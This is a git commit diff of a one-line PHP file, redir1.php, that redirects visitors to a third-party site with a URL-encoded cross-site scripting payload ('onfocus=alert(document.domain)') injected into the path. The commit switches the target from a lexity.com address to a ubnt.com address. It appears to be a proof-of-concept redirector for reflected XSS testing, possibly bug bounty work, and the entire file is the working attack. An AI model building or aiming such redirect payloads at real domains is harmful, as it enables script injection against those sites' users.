1df73d7b6769ec5bc43612781fd5fe92e1e5d1e4
missoum1307 <missoum1307@users.noreply.github.com>
2017-12-15 22:54:55 +0100

    Update redir1.php

--- redir1.php
+++ redir1.php
@@ -1,1 +1,1 @@
-<?php header('location: https://np.lexity.com/f57ea75d/h/1/v/q/k/aaa/u/xxxx/r/fff/vn/1/c/%3Cx~%0Aonfocus=alert(document.domain)%20id=a%20tabindex=0%3E%3C--') ?> 
+<?php header('location: https://dev-unifi-go.ubnt.com/sss%3Cx~%0Aonfocus=alert(document.domain)%20id=a%20tabindex=0%3E%3C--') ?> 
